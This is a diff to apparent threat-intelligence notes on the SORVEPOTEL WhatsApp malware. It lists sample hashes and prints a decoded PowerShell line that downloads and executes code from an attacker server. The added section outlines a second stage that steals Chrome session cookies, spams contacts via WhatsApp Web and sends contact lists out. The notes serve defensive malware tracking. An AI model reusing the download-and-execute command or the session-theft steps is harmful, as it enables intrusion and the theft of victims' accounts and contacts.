@@ -68,6 +68,8 @@ Income-tax lure PDF opens `ggwk[.]cc`, which serves `tax affairs.exe` (NSIS inst
 ## SORVEPOTEL shortcut sample (VirusTotal, first seen 1 Oct 2025)
 `malware-whatsapp.rar` (SHA-256 5debd60e266037898bd11f94de614b8411ee2c6b4fd1d54ca0c21578a67614ac, 727 bytes, 27/76 engines, Trend Micro name SORVEPOTEL) contains `DOC-50998906_17774E7A.lnk` (SHA-256 af085f3afbe074c0da6a354be3aabc4677ed03bd0627b4447fb68c6e16089943). The shortcut runs an obfuscated `cmd /D/C "for %Y in (nc) do ..."` that builds `powershell -w hid -enc ...`, which decodes to `IEX (New-Object Net.WebClient).DownloadString('https://zapgrande[.]com/api/itbi/PxlJWZbCuamhhCWjurXBv6K0w1vfVGTw')`. C2: zapgrande.com (109.176.30.141:443).
 
+SORVEPOTEL stage 2 (code shared on X, Portuguese comments): PowerShell copies `Cookies`, `Preferences` and `Secure Preferences` from the Chrome profile to `C:\temp\ChromeWpp`, downloads `C:\temp\chromedriver.exe` (Chrome for Testing) and `C:\temp\wppconnect-wa.js` (github.com/wppconnect-team/wa-js), installs the `Selenium` PowerShell module for the current user, kills Chrome, opens WhatsApp Web with the copied session, sends the lure to contacts, and POSTs machine name, OS and the contact list (name + number) to `api.php` / `log.php` / `config.php` / `contacts.php` on the attacker server. Chrome only.
+
 ## References
 
 - CloudSEK, Silver Fox targeting India using tax-themed phishing lures (2025-12-24): https://www.cloudsek.com/blog/silver-fox-targeting-india-using-tax-themed-phishing-lures
